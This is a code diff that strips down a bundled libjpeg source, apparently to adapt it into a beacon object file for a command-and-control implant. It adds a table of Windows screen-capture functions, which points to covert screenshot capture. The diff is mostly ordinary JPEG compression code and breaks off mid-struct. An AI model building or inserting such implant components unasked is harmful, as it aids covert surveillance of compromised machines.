@@ -28,6 +28,24 @@ void FakeBeaconOutput(int mode, const char* buf, int len)
 
 #endif
 
+// For the fucking stupid problem of the bof loader in beacon
+struct Functions
+{
+    decltype(GetDC)* GetDC;
+    decltype(DeleteDC)* DeleteDC;
+    decltype(ReleaseDC)* ReleaseDC;
+    decltype(DeleteObject)* DeleteObject;
+    decltype(CreateCompatibleDC)* CreateCompatibleDC;
+    decltype(CreateDIBSection)* CreateDIBSection;
+    decltype(SelectObject)* SelectObject;
+    decltype(BitBlt)* BitBlt;
+    decltype(GetObjectW)* GetObjectW;
+    decltype(GetCurrentObject)* GetCurrentObject;
+    decltype(ExpandEnvironmentStringsA)* ExpandEnvironmentStringsA;
+    //decltype()* ;
+};
+
+Functions __attribute__ ((section(".data"))) functions;
 
 /*
  * jfdctint.c
@@ -575,60 +593,27 @@ METHODDEF(void) finish_pass_gather JPP((j_compress_ptr cinfo));
  * just count the Huffman symbols used and generate Huffman code tables.
  */
 
-METHODDEF(void)
-start_pass_huff (j_compress_ptr cinfo, boolean gather_statistics)
+void start_pass_huff (j_compress_ptr cinfo, bool gather_statistics)
 {
   huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
   int ci, dctbl, actbl;
   jpeg_component_info * compptr;
 
-  if (gather_statistics) {
-#ifdef ENTROPY_OPT_SUPPORTED
-    entropy->pub.encode_mcu = encode_mcu_gather;
-    entropy->pub.finish_pass = finish_pass_gather;
-#else
-    ERREXIT(cinfo, JERR_NOT_COMPILED);
-#endif
-  } else {
-    entropy->pub.encode_mcu = encode_mcu_huff;
-    entropy->pub.finish_pass = finish_pass_huff;
-  }
+  entropy->pub.encode_mcu = encode_mcu_huff;
+  entropy->pub.finish_pass = finish_pass_huff;
 
   for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
-    compptr = cinfo->cur_comp_info[ci];
-    dctbl = compptr->dc_tbl_no;
-    actbl = compptr->ac_tbl_no;
-    if (gather_statistics) {
-#ifdef ENTROPY_OPT_SUPPORTED
-      /* Check for invalid table indexes */
-      /* (make_c_derived_tbl does this in the other path) */
-      if (dctbl < 0 || dctbl >= NUM_HUFF_TBLS)
-	ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, dctbl);
-      if (actbl < 0 || actbl >= NUM_HUFF_TBLS)
-	ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, actbl);
-      /* Allocate and zero the statistics tables */
-      /* Note that jpeg_gen_optimal_table expects 257 entries in each table! */
-      if (entropy->dc_count_ptrs[dctbl] == NULL)
-	entropy->dc_count_ptrs[dctbl] = (long *)
-	  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
-				      257 * SIZEOF(long));
-      MEMZERO(entropy->dc_count_ptrs[dctbl], 257 * SIZEOF(long));
-      if (entropy->ac_count_ptrs[actbl] == NULL)
-	entropy->ac_count_ptrs[actbl] = (long *)
-	  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
-				      257 * SIZEOF(long));
-      MEMZERO(entropy->ac_count_ptrs[actbl], 257 * SIZEOF(long));
-#endif
-    } else {
+      compptr = cinfo->cur_comp_info[ci];
+      dctbl = compptr->dc_tbl_no;
+      actbl = compptr->ac_tbl_no;
       /* Compute derived values for Huffman tables */
       /* We may do this more than once for a table, but it's not expensive */
       jpeg_make_c_derived_tbl(cinfo, TRUE, dctbl,
-			      & entropy->dc_derived_tbls[dctbl]);
+          &entropy->dc_derived_tbls[dctbl]);
       jpeg_make_c_derived_tbl(cinfo, FALSE, actbl,
-			      & entropy->ac_derived_tbls[actbl]);
-    }
-    /* Initialize DC predictions to 0 */
-    entropy->saved.last_dc_val[ci] = 0;
+          &entropy->ac_derived_tbls[actbl]);
+      /* Initialize DC predictions to 0 */
+      entropy->saved.last_dc_val[ci] = 0;
   }
 
   /* Initialize bit buffer to empty */
@@ -1024,338 +1009,6 @@ finish_pass_huff (j_compress_ptr cinfo)
   ASSIGN_STATE(entropy->saved, state.cur);
 }
 
-
-/*
- * Huffman coding optimization.
- *
- * We first scan the supplied data and count the number of uses of each symbol
- * that is to be Huffman-coded. (This process MUST agree with the code above.)
- * Then we build a Huffman coding tree for the observed counts.
- * Symbols which are not needed at all for the particular image are not
- * assigned any code, which saves space in the DHT marker as well as in
- * the compressed data.
- */
-
-#ifdef ENTROPY_OPT_SUPPORTED
-
-
-/* Process a single block's worth of coefficients */
-
-LOCAL(void)
-htest_one_block (j_compress_ptr cinfo, JCOEFPTR block, int last_dc_val,
-		 long dc_counts[], long ac_counts[])
-{
-  int temp;
-  int nbits;
-  int k, r;
-  
-  /* Encode the DC coefficient difference per section F.1.2.1 */
-  
-  temp = block[0] - last_dc_val;
-  if (temp < 0)
-    temp = -temp;
-  
-  /* Find the number of bits needed for the magnitude of the coefficient */
-  nbits = 0;
-  while (temp) {
-    nbits++;
-    temp >>= 1;
-  }
-  /* Check for out-of-range coefficient values.
-   * Since we're encoding a difference, the range limit is twice as much.
-   */
-  if (nbits > MAX_COEF_BITS+1)
-    ERREXIT(cinfo, JERR_BAD_DCT_COEF);
-
-  /* Count the Huffman symbol for the number of bits */
-  dc_counts[nbits]++;
-  
-  /* Encode the AC coefficients per section F.1.2.2 */
-  
-  r = 0;			/* r = run length of zeros */
-  
-  for (k = 1; k < DCTSIZE2; k++) {
-    if ((temp = block[jpeg_natural_order[k]]) == 0) {
-      r++;
-    } else {
-      /* if run length > 15, must emit special run-length-16 codes (0xF0) */
-      while (r > 15) {
-	ac_counts[0xF0]++;
-	r -= 16;
-      }
-      
-      /* Find the number of bits needed for the magnitude of the coefficient */
-      if (temp < 0)
-	temp = -temp;
-      
-      /* Find the number of bits needed for the magnitude of the coefficient */
-      nbits = 1;		/* there must be at least one 1 bit */
-      while ((temp >>= 1))
-	nbits++;
-      /* Check for out-of-range coefficient values */
-      if (nbits > MAX_COEF_BITS)
-	ERREXIT(cinfo, JERR_BAD_DCT_COEF);
-      
-      /* Count Huffman symbol for run length / number of bits */
-      ac_counts[(r << 4) + nbits]++;
-      
-      r = 0;
-    }
-  }
-
-  /* If the last coef(s) were zero, emit an end-of-block code */
-  if (r > 0)
-    ac_counts[0]++;
-}
-
-
-/*
- * Trial-encode one MCU's worth of Huffman-compressed coefficients.
- * No data is actually output, so no suspension return is possible.
- */
-
-METHODDEF(boolean)
-encode_mcu_gather (j_compress_ptr cinfo, JBLOCKROW *MCU_data)
-{
-  huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
-  int blkn, ci;
-  jpeg_component_info * compptr;
-
-  /* Take care of restart intervals if needed */
-  if (cinfo->restart_interval) {
-    if (entropy->restarts_to_go == 0) {
-      /* Re-initialize DC predictions to 0 */
-      for (ci = 0; ci < cinfo->comps_in_scan; ci++)
-	entropy->saved.last_dc_val[ci] = 0;
-      /* Update restart state */
-      entropy->restarts_to_go = cinfo->restart_interval;
-    }
-    entropy->restarts_to_go--;
-  }
-
-  for (blkn = 0; blkn < cinfo->blocks_in_MCU; blkn++) {
-    ci = cinfo->MCU_membership[blkn];
-    compptr = cinfo->cur_comp_info[ci];
-    htest_one_block(cinfo, MCU_data[blkn][0], entropy->saved.last_dc_val[ci],
-		    entropy->dc_count_ptrs[compptr->dc_tbl_no],
-		    entropy->ac_count_ptrs[compptr->ac_tbl_no]);
-    entropy->saved.last_dc_val[ci] = MCU_data[blkn][0][0];
-  }
-
-  return TRUE;
-}
-
-
-/*
- * Generate the best Huffman code table for the given counts, fill htbl.
- * Note this is also used by jcphuff.c.
- *
- * The JPEG standard requires that no symbol be assigned a codeword of all
- * one bits (so that padding bits added at the end of a compressed segment
- * can't look like a valid code).  Because of the canonical ordering of
- * codewords, this just means that there must be an unused slot in the
- * longest codeword length category.  Section K.2 of the JPEG spec suggests
- * reserving such a slot by pretending that symbol 256 is a valid symbol
- * with count 1.  In theory that's not optimal; giving it count zero but
- * including it in the symbol set anyway should give a better Huffman code.
- * But the theoretically better code actually seems to come out worse in
- * practice, because it produces more all-ones bytes (which incur stuffed
- * zero bytes in the final file).  In any case the difference is tiny.
- *
- * The JPEG standard requires Huffman codes to be no more than 16 bits long.
- * If some symbols have a very small but nonzero probability, the Huffman tree
- * must be adjusted to meet the code length restriction.  We currently use
- * the adjustment method suggested in JPEG section K.2.  This method is *not*
- * optimal; it may not choose the best possible limited-length code.  But
- * typically only very-low-frequency symbols will be given less-than-optimal
- * lengths, so the code is almost optimal.  Experimental comparisons against
- * an optimal limited-length-code algorithm indicate that the difference is
- * microscopic --- usually less than a hundredth of a percent of total size.
- * So the extra complexity of an optimal algorithm doesn't seem worthwhile.
- */
-
-GLOBAL(void)
-jpeg_gen_optimal_table (j_compress_ptr cinfo, JHUFF_TBL * htbl, long freq[])
-{
-#define MAX_CLEN 32		/* assumed maximum initial code length */
-  UINT8 bits[MAX_CLEN+1];	/* bits[k] = # of symbols with code length k */
-  int codesize[257];		/* codesize[k] = code length of symbol k */
-  int others[257];		/* next symbol in current branch of tree */
-  int c1, c2;
-  int p, i, j;
-  long v;
-
-  /* This algorithm is explained in section K.2 of the JPEG standard */
-
-  MEMZERO(bits, SIZEOF(bits));
-  MEMZERO(codesize, SIZEOF(codesize));
-  for (i = 0; i < 257; i++)
-    others[i] = -1;		/* init links to empty */
-  
-  freq[256] = 1;		/* make sure 256 has a nonzero count */
-  /* Including the pseudo-symbol 256 in the Huffman procedure guarantees
-   * that no real symbol is given code-value of all ones, because 256
-   * will be placed last in the largest codeword category.
-   */
-
-  /* Huffman's basic algorithm to assign optimal code lengths to symbols */
-
-  for (;;) {
-    /* Find the smallest nonzero frequency, set c1 = its symbol */
-    /* In case of ties, take the larger symbol number */
-    c1 = -1;
-    v = 1000000000L;
-    for (i = 0; i <= 256; i++) {
-      if (freq[i] && freq[i] <= v) {
-	v = freq[i];
-	c1 = i;
-      }
-    }
-
-    /* Find the next smallest nonzero frequency, set c2 = its symbol */
-    /* In case of ties, take the larger symbol number */
-    c2 = -1;
-    v = 1000000000L;
-    for (i = 0; i <= 256; i++) {
-      if (freq[i] && freq[i] <= v && i != c1) {
-	v = freq[i];
-	c2 = i;
-      }
-    }
-
-    /* Done if we've merged everything into one frequency */
-    if (c2 < 0)
-      break;
-    
-    /* Else merge the two counts/trees */
-    freq[c1] += freq[c2];
-    freq[c2] = 0;
-
-    /* Increment the codesize of everything in c1's tree branch */
-    codesize[c1]++;
-    while (others[c1] >= 0) {
-      c1 = others[c1];
-      codesize[c1]++;
-    }
-    
-    others[c1] = c2;		/* chain c2 onto c1's tree branch */
-    
-    /* Increment the codesize of everything in c2's tree branch */
-    codesize[c2]++;
-    while (others[c2] >= 0) {
-      c2 = others[c2];
-      codesize[c2]++;
-    }
-  }
-
-  /* Now count the number of symbols of each code length */
-  for (i = 0; i <= 256; i++) {
-    if (codesize[i]) {
-      /* The JPEG standard seems to think that this can't happen, */
-      /* but I'm paranoid... */
-      if (codesize[i] > MAX_CLEN)
-	ERREXIT(cinfo, JERR_HUFF_CLEN_OVERFLOW);
-
-      bits[codesize[i]]++;
-    }
-  }
-
-  /* JPEG doesn't allow symbols with code lengths over 16 bits, so if the pure
-   * Huffman procedure assigned any such lengths, we must adjust the coding.
-   * Here is what the JPEG spec says about how this next bit works:
-   * Since symbols are paired for the longest Huffman code, the symbols are
-   * removed from this length category two at a time.  The prefix for the pair
-   * (which is one bit shorter) is allocated to one of the pair; then,
-   * skipping the BITS entry for that prefix length, a code word from the next
-   * shortest nonzero BITS entry is converted into a prefix for two code words
-   * one bit longer.
-   */
-  
-  for (i = MAX_CLEN; i > 16; i--) {
-    while (bits[i] > 0) {
-      j = i - 2;		/* find length of new prefix to be used */
-      while (bits[j] == 0)
-	j--;
-      
-      bits[i] -= 2;		/* remove two symbols */
-      bits[i-1]++;		/* one goes in this length */
-      bits[j+1] += 2;		/* two new symbols in this length */
-      bits[j]--;		/* symbol of this length is now a prefix */
-    }
-  }
-
-  /* Remove the count for the pseudo-symbol 256 from the largest codelength */
-  while (bits[i] == 0)		/* find largest codelength still in use */
-    i--;
-  bits[i]--;
-  
-  /* Return final symbol counts (only for lengths 0..16) */
-  MEMCOPY(htbl->bits, bits, SIZEOF(htbl->bits));
-  
-  /* Return a list of the symbols sorted by code length */
-  /* It's not real clear to me why we don't need to consider the codelength
-   * changes made above, but the JPEG spec seems to think this works.
-   */
-  p = 0;
-  for (i = 1; i <= MAX_CLEN; i++) {
-    for (j = 0; j <= 255; j++) {
-      if (codesize[j] == i) {
-	htbl->huffval[p] = (UINT8) j;
-	p++;
-      }
-    }
-  }
-
-  /* Set sent_table FALSE so updated table will be written to JPEG file. */
-  htbl->sent_table = FALSE;
-}
-
-
-/*
- * Finish up a statistics-gathering pass and create the new Huffman tables.
- */
-
-METHODDEF(void)
-finish_pass_gather (j_compress_ptr cinfo)
-{
-  huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
-  int ci, dctbl, actbl;
-  jpeg_component_info * compptr;
-  JHUFF_TBL **htblptr;
-  boolean did_dc[NUM_HUFF_TBLS];
-  boolean did_ac[NUM_HUFF_TBLS];
-
-  /* It's important not to apply jpeg_gen_optimal_table more than once
-   * per table, because it clobbers the input frequency counts!
-   */
-  MEMZERO(did_dc, SIZEOF(did_dc));
-  MEMZERO(did_ac, SIZEOF(did_ac));
-
-  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
-    compptr = cinfo->cur_comp_info[ci];
-    dctbl = compptr->dc_tbl_no;
-    actbl = compptr->ac_tbl_no;
-    if (! did_dc[dctbl]) {
-      htblptr = & cinfo->dc_huff_tbl_ptrs[dctbl];
-      if (*htblptr == NULL)
-	*htblptr = jpeg_alloc_huff_table((j_common_ptr) cinfo);
-      jpeg_gen_optimal_table(cinfo, *htblptr, entropy->dc_count_ptrs[dctbl]);
-      did_dc[dctbl] = TRUE;
-    }
-    if (! did_ac[actbl]) {
-      htblptr = & cinfo->ac_huff_tbl_ptrs[actbl];
-      if (*htblptr == NULL)
-	*htblptr = jpeg_alloc_huff_table((j_common_ptr) cinfo);
-      jpeg_gen_optimal_table(cinfo, *htblptr, entropy->ac_count_ptrs[actbl]);
-      did_ac[actbl] = TRUE;
-    }
-  }
-}
-
-
-#endif /* ENTROPY_OPT_SUPPORTED */
-
-
 /*
  * Module initialization routine for Huffman entropy encoding.
  */
@@ -1375,11 +1028,10 @@ jinit_huff_encoder (j_compress_ptr cinfo)
   /* Mark tables unallocated */
   for (i = 0; i < NUM_HUFF_TBLS; i++) {
     entropy->dc_derived_tbls[i] = entropy->ac_derived_tbls[i] = NULL;
-#ifdef ENTROPY_OPT_SUPPORTED
-    entropy->dc_count_ptrs[i] = entropy->ac_count_ptrs[i] = NULL;
-#endif
   }
 }
+
+
 /*
  * jfdctfst.c
  *
@@ -1654,124 +1306,125 @@ typedef my_fdct_controller * my_fdct_ptr;
  * first scan.  Hence all components should be examined here.
  */
 
-METHODDEF(void)
-start_pass_fdctmgr (j_compress_ptr cinfo)
+int start_pass_fdctmgr(j_compress_ptr cinfo)
 {
-  my_fdct_ptr fdct = (my_fdct_ptr) cinfo->fdct;
-  int ci, qtblno, i;
-  jpeg_component_info *compptr;
-  JQUANT_TBL * qtbl;
-  DCTELEM * dtbl;
+    my_fdct_ptr fdct = (my_fdct_ptr)cinfo->fdct;
+    int ci, qtblno, i;
+    jpeg_component_info* compptr;
+    JQUANT_TBL* qtbl;
+    DCTELEM* dtbl;
 
-  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
-       ci++, compptr++) {
-    qtblno = compptr->quant_tbl_no;
-    /* Make sure specified quantization table is present */
-    if (qtblno < 0 || qtblno >= NUM_QUANT_TBLS ||
-	cinfo->quant_tbl_ptrs[qtblno] == NULL)
-      ERREXIT1(cinfo, JERR_NO_QUANT_TABLE, qtblno);
-    qtbl = cinfo->quant_tbl_ptrs[qtblno];
-    /* Compute divisors for this quant table */
-    /* We may do this more than once for same table, but it's not a big deal */
-    switch (cinfo->dct_method) {
+    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
+        ci++, compptr++) {
+        qtblno = compptr->quant_tbl_no;
+        /* Make sure specified quantization table is present */
+        if (qtblno < 0 || qtblno >= NUM_QUANT_TBLS || cinfo->quant_tbl_ptrs[qtblno] == NULL) {
+            return JERR_NO_QUANT_TABLE;
+        }
+        qtbl = cinfo->quant_tbl_ptrs[qtblno];
+        /* Compute divisors for this quant table */
+        /* We may do this more than once for same table, but it's not a big deal */
+        switch (cinfo->dct_method) {
 #ifdef DCT_ISLOW_SUPPORTED
-    case JDCT_ISLOW:
-      /* For LL&M IDCT method, divisors are equal to raw quantization
-       * coefficients multiplied by 8 (to counteract scaling).
-       */
-      if (fdct->divisors[qtblno] == NULL) {
-	fdct->divisors[qtblno] = (DCTELEM *)
-	  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
-				      DCTSIZE2 * SIZEOF(DCTELEM));
-      }
-      dtbl = fdct->divisors[qtblno];
-      for (i = 0; i < DCTSIZE2; i++) {
-	dtbl[i] = ((DCTELEM) qtbl->quantval[i]) << 3;
-      }
-      break;
+        case JDCT_ISLOW:
+            /* For LL&M IDCT method, divisors are equal to raw quantization
+             * coefficients multiplied by 8 (to counteract scaling).
+             */
+            if (fdct->divisors[qtblno] == NULL) {
+                fdct->divisors[qtblno] = (DCTELEM*)
+                    (*cinfo->mem->alloc_small) ((j_common_ptr)cinfo, JPOOL_IMAGE,
+                        DCTSIZE2 * SIZEOF(DCTELEM));
+            }
+            dtbl = fdct->divisors[qtblno];
+            for (i = 0; i < DCTSIZE2; i++) {
+                dtbl[i] = ((DCTELEM)qtbl->quantval[i]) << 3;
+            }
+            break;
 #endif
 #ifdef DCT_IFAST_SUPPORTED
-    case JDCT_IFAST:
-      {
-	/* For AA&N IDCT method, divisors are equal to quantization
-	 * coefficients scaled by scalefactor[row]*scalefactor[col], where
-	 *   scalefactor[0] = 1
-	 *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7
-	 * We apply a further scale factor of 8.
-	 */
+        case JDCT_IFAST:
+        {
+            /* For AA&N IDCT method, divisors are equal to quantization
+             * coefficients scaled by scalefactor[row]*scalefactor[col], where
+             *   scalefactor[0] = 1
+             *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7
+             * We apply a further scale factor of 8.
+             */
 #ifdef CONST_BITS
 #undef CONST_BITS
 #endif
 #define CONST_BITS 14
-	static const INT16 aanscales[DCTSIZE2] = {
-	  /* precomputed values scaled up by 14 bits */
-	  16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,
-	  22725, 31521, 29692, 26722, 22725, 17855, 12299,  6270,
-	  21407, 29692, 27969, 25172, 21407, 16819, 11585,  5906,
-	  19266, 26722, 25172, 22654, 19266, 15137, 10426,  5315,
-	  16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,
-	  12873, 17855, 16819, 15137, 12873, 10114,  6967,  3552,
-	   8867, 12299, 11585, 10426,  8867,  6967,  4799,  2446,
-	   4520,  6270,  5906,  5315,  4520,  3552,  2446,  1247
-	};
-	SHIFT_TEMPS
+            static const INT16 aanscales[DCTSIZE2] = {
+                /* precomputed values scaled up by 14 bits */
+                16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,
+                22725, 31521, 29692, 26722, 22725, 17855, 12299,  6270,
+                21407, 29692, 27969, 25172, 21407, 16819, 11585,  5906,
+                19266, 26722, 25172, 22654, 19266, 15137, 10426,  5315,
+                16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,
+                12873, 17855, 16819, 15137, 12873, 10114,  6967,  3552,
+                 8867, 12299, 11585, 10426,  8867,  6967,  4799,  2446,
+                 4520,  6270,  5906,  5315,  4520,  3552,  2446,  1247
+            };
+            SHIFT_TEMPS
 
-	if (fdct->divisors[qtblno] == NULL) {
-	  fdct->divisors[qtblno] = (DCTELEM *)
-	    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
-					DCTSIZE2 * SIZEOF(DCTELEM));
-	}
-	dtbl = fdct->divisors[qtblno];
-	for (i = 0; i < DCTSIZE2; i++) {
-	  dtbl[i] = (DCTELEM)
-	    DESCALE(MULTIPLY16V16((INT32) qtbl->quantval[i],
-				  (INT32) aanscales[i]),
-		    CONST_BITS-3);
-	}
-      }
-      break;
+                if (fdct->divisors[qtblno] == NULL) {
+                    fdct->divisors[qtblno] = (DCTELEM*)
+                        (*cinfo->mem->alloc_small) ((j_common_ptr)cinfo, JPOOL_IMAGE,
+                            DCTSIZE2 * SIZEOF(DCTELEM));
+                }
+            dtbl = fdct->divisors[qtblno];
+            for (i = 0; i < DCTSIZE2; i++) {
+                dtbl[i] = (DCTELEM)
+                    DESCALE(MULTIPLY16V16((INT32)qtbl->quantval[i],
+                        (INT32)aanscales[i]),
+                        CONST_BITS - 3);
+            }
+        }
+        break;
 #endif
 #ifdef DCT_FLOAT_SUPPORTED
-    case JDCT_FLOAT:
-      {
-	/* For float AA&N IDCT method, divisors are equal to quantization
-	 * coefficients scaled by scalefactor[row]*scalefactor[col], where
-	 *   scalefactor[0] = 1
-	 *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7
-	 * We apply a further scale factor of 8.
-	 * What's actually stored is 1/divisor so that the inner loop can
-	 * use a multiplication rather than a division.
-	 */
-	FAST_FLOAT * fdtbl;
-	int row, col;
-	static const double aanscalefactor[DCTSIZE] = {
-	  1.0, 1.387039845, 1.306562965, 1.175875602,
-	  1.0, 0.785694958, 0.541196100, 0.275899379
-	};
+        case JDCT_FLOAT:
+        {
+            /* For float AA&N IDCT method, divisors are equal to quantization
+             * coefficients scaled by scalefactor[row]*scalefactor[col], where
+             *   scalefactor[0] = 1
+             *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7
+             * We apply a further scale factor of 8.
+             * What's actually stored is 1/divisor so that the inner loop can
+             * use a multiplication rather than a division.
+             */
+            FAST_FLOAT* fdtbl;
+            int row, col;
+            static const double aanscalefactor[DCTSIZE] = {
+              1.0, 1.387039845, 1.306562965, 1.175875602,
+              1.0, 0.785694958, 0.541196100, 0.275899379
+            };
 
-	if (fdct->float_divisors[qtblno] == NULL) {
-	  fdct->float_divisors[qtblno] = (FAST_FLOAT *)
-	    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
-					DCTSIZE2 * SIZEOF(FAST_FLOAT));
-	}
-	fdtbl = fdct->float_divisors[qtblno];
-	i = 0;
-	for (row = 0; row < DCTSIZE; row++) {
-	  for (col = 0; col < DCTSIZE; col++) {
-	    fdtbl[i] = (FAST_FLOAT)
-	      (1.0 / (((double) qtbl->quantval[i] *
-		       aanscalefactor[row] * aanscalefactor[col] * 8.0)));
-	    i++;
-	  }
-	}
-      }
-      break;
+            if (fdct->float_divisors[qtblno] == NULL) {
+                fdct->float_divisors[qtblno] = (FAST_FLOAT*)
+                    (*cinfo->mem->alloc_small) ((j_common_ptr)cinfo, JPOOL_IMAGE,
+                        DCTSIZE2 * SIZEOF(FAST_FLOAT));
+            }
+            fdtbl = fdct->float_divisors[qtblno];
+            i = 0;
+            for (row = 0; row < DCTSIZE; row++) {
+                for (col = 0; col < DCTSIZE; col++) {
+                    fdtbl[i] = (FAST_FLOAT)
+                        (1.0 / (((double)qtbl->quantval[i] *
+                            aanscalefactor[row] * aanscalefactor[col] * 8.0)));
+                    i++;
+                }
+            }
+        }
+        break;
 #endif
-    default:
-      ERREXIT(cinfo, JERR_NOT_COMPILED);
-      break;
+        default:
+            return JERR_NOT_COMPILED;
+            break;
+        }
     }
-  }
+
+    return 0;
 }
 
 
@@ -4448,6 +4101,7 @@ METHODDEF(void)
 prepare_for_pass (j_compress_ptr cinfo)
 {
   my_master_ptr master = (my_master_ptr) cinfo->master;
+  int status;
 
   switch (master->pass_type) {
   case main_pass:
@@ -4461,7 +4115,10 @@ prepare_for_pass (j_compress_ptr cinfo)
       (*cinfo->downsample->start_pass) (cinfo);
       (*cinfo->prep->start_pass) (cinfo, JBUF_PASS_THRU);
     }
-    (*cinfo->fdct->start_pass) (cinfo);
+    status = (*cinfo->fdct->start_pass) (cinfo);
+    if (status != 0) {
+        return;
+    }
     (*cinfo->entropy->start_pass) (cinfo, cinfo->optimize_coding);
     (*cinfo->coef->start_pass) (cinfo,
 				(master->total_passes > 1 ?
@@ -4475,24 +4132,6 @@ prepare_for_pass (j_compress_ptr cinfo)
       master->pub.call_pass_startup = TRUE;
     }
     break;
-#ifdef ENTROPY_OPT_SUPPORTED
-  case huff_opt_pass:
-    /* Do Huffman optimization for a scan after the first one. */
-    select_scan_parameters(cinfo);
-    per_scan_setup(cinfo);
-    if (cinfo->Ss != 0 || cinfo->Ah == 0 || cinfo->arith_code) {
-      (*cinfo->entropy->start_pass) (cinfo, TRUE);
-      (*cinfo->coef->start_pass) (cinfo, JBUF_CRANK_DEST);
-      master->pub.call_pass_startup = FALSE;
-      break;
-    }
-    /* Special case: Huffman DC refinement scans need no Huffman table
-     * and therefore we can skip the optimization pass for them.
-     */
-    master->pass_type = output_pass;
-    master->pass_number++;
-    /*FALLTHROUGH*/
-#endif
   case output_pass:
     /* Do a data-output pass. */
     /* We need not repeat per-scan setup if prior optimization pass did it. */
@@ -6799,6 +6438,7 @@ jinit_memory_mgr (j_common_ptr cinfo)
    * If your system doesn't support getenv(), define NO_GETENV to disable
    * this feature.
    */
+#if 0
 #ifndef NO_GETENV
   { char * memenv;
 
@@ -6812,6 +6452,7 @@ jinit_memory_mgr (j_common_ptr cinfo)
       }
     }
   }
+#endif
 #endif
 
 }
@@ -8180,7 +7821,7 @@ error_exit (j_common_ptr cinfo)
   /* Let the memory manager delete any temp files before we die */
   jpeg_destroy(cinfo);
 
-  exit(EXIT_FAILURE);
+  //exit(EXIT_FAILURE);
 }
 
 
@@ -8201,21 +7842,7 @@ error_exit (j_common_ptr cinfo)
 
 void output_message (j_common_ptr cinfo)
 {
-  char buffer[JMSG_LENGTH_MAX];
-
-  /* Create the message */
-  (*cinfo->err->format_message) (cinfo, buffer);
-
-#ifdef USE_WINDOWS_MESSAGEBOX
-  /* Display it in a message dialog box */
-  MessageBox(GetActiveWindow(), buffer, "JPEG Library Error",
-	     MB_OK | MB_ICONERROR);
-#else
-  /* Send it to stderr, adding a newline */
-  printf("%s\n", buffer);
-#endif
 }
-
 
 /*
  * Decide whether to emit a trace or warning message.
@@ -8231,24 +7858,7 @@ void output_message (j_common_ptr cinfo)
 METHODDEF(void)
 emit_message (j_common_ptr cinfo, int msg_level)
 {
-  struct jpeg_error_mgr * err = cinfo->err;
-
-  if (msg_level < 0) {
-    /* It's a warning message.  Since corrupt files may generate many warnings,
-     * the policy implemented here is to show only the first warning,
-     * unless trace_level >= 3.
-     */
-    if (err->num_warnings == 0 || err->trace_level >= 3)
-      (*err->output_message) (cinfo);
-    /* Always count warnings in num_warnings. */
-    err->num_warnings++;
-  } else {
-    /* It's a trace message.  Show it if trace_level >= msg_level. */
-    if (err->trace_level >= msg_level)
-      (*err->output_message) (cinfo);
-  }
 }
-
 
 /*
  * Format a message string for the most recent JPEG error or message.
@@ -8260,49 +7870,7 @@ emit_message (j_common_ptr cinfo, int msg_level)
 METHODDEF(void)
 format_message (j_common_ptr cinfo, char * buffer)
 {
-  struct jpeg_error_mgr * err = cinfo->err;
-  int msg_code = err->msg_code;
-  const char * msgtext = NULL;
-  const char * msgptr;
-  char ch;
-  boolean isstring;
-
-  /* Look up message string in proper table */
-  if (msg_code > 0 && msg_code <= err->last_jpeg_message) {
-    msgtext = err->jpeg_message_table[msg_code];
-  } else if (err->addon_message_table != NULL &&
-	     msg_code >= err->first_addon_message &&
-	     msg_code <= err->last_addon_message) {
-    msgtext = err->addon_message_table[msg_code - err->first_addon_message];
-  }
-
-  /* Defend against bogus message number */
-  if (msgtext == NULL) {
-    err->msg_parm.i[0] = msg_code;
-    msgtext = err->jpeg_message_table[0];
-  }
-
-  /* Check for string parameter, as indicated by %s in the message text */
-  isstring = FALSE;
-  msgptr = msgtext;
-  while ((ch = *msgptr++) != '\0') {
-    if (ch == '%') {
-      if (*msgptr == 's') isstring = TRUE;
-      break;
-    }
-  }
-
-  /* Format the message into the passed buffer */
-  if (isstring)
-    sprintf(buffer, msgtext, err->msg_parm.s);
-  else
-    sprintf(buffer, msgtext,
-	    err->msg_parm.i[0], err->msg_parm.i[1],
-	    err->msg_parm.i[2], err->msg_parm.i[3],
-	    err->msg_parm.i[4], err->msg_parm.i[5],
-	    err->msg_parm.i[6], err->msg_parm.i[7]);
 }
-
 
 /*
  * Reset error state variables at start of a new image.
@@ -8319,17 +7887,6 @@ reset_error_mgr (j_common_ptr cinfo)
   /* trace_level is not reset since it is an application-supplied parameter */
   cinfo->err->msg_code = 0;	/* may be useful as a flag for "no error" */
 }
-
-
-/*
- * Fill in the standard error-handling methods in a jpeg_error_mgr object.
- * Typical call is:
- *	struct jpeg_compress_struct cinfo;
- *	struct jpeg_error_mgr err;
- *
- *	cinfo.err = jpeg_std_error(&err);
- * after which the application may override some of the methods.
- */
 
 GLOBAL(struct jpeg_error_mgr *)
 jpeg_std_error (struct jpeg_error_mgr * err)
@@ -8356,7 +7913,6 @@ jpeg_std_error (struct jpeg_error_mgr * err)
 }
 
 
-
 /*
 bmp2jpeg.c
 convert bmp raw binary to jpeg format
@@ -8365,22 +7921,73 @@ convert bmp raw binary to jpeg format
 #include <setjmp.h>
 #include <string.h>
 
-BOOL bmp2jpeg(const char* jpg_path, uint8_t* bmp_bytes, size_t bmp_size, int width, int height, int quality)
+struct jpeg_memory_destination
+{
+    struct jpeg_destination_mgr pub;
+    size_t capacity;
